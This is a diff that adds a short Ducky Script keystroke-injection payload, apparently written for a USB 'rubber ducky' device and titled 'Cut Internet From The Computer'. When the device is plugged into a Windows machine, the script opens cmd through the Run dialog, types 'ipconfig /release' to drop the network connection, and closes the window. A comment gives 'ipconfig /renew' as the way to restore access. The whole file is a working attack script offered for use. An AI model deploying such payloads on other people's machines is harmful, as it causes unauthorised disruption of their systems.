@@ -1,0 +1,17 @@
+REM Cut Internet From The Computer
+REM Target: Windows
+REM If you want reactivate internet type this in the cmd : ipconfig /renew
+REM Auth : oxooi
+DELAY 300
+
+GUI R
+DELAY 100
+STRING cmd
+DELAY 300
+ENTER
+DELAY 300
+STRING ipconfig /release
+DELAY 300
+ENTER
+DELAY 200
+ALT F4
